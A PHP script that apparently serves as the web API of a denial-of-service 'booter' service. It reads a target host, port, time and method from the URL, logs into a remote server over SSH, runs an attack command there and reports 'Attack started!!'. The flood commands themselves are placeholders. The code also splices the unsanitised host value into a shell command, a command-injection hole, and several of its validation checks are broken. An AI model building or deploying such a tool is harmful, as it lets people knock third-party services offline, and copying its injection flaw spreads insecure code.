// http://IPhere/Perl.php?key=API-Password-Here&host=host&port=port&time=time&method=method
 
<?php
ignore_user_abort(true);
set_time_limit(1000);
$server_ip = "IPhere";  
$server_pass = "Passwordhere";  
$server_user = "Usernamehere";  
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$array = array("Methods-Here");
$ray = array("API-Password"); //This is your API password.
if (!empty($key)){
}else{
die('Error: API key is empty!');}
if (in_array($key, $ray)){
}else{
die('Error: Incorrect API key!');}
if (!empty($time)){
}else{
die('Error: time is empty!');}
if (!empty($host)){
}else{
die('Error: Host is empty!');}
if (!empty($method)){
}else{
die('Error: Method is empty!');}
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}  
if ($time > 1000){
die('Error: Cannot exceed 1000 seconds!');}  
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
if ($method == "Method") { $command = "Method-command"; }
if ($action == "stop") { $command = "pkill $host -f"; }
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
    echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
            echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>
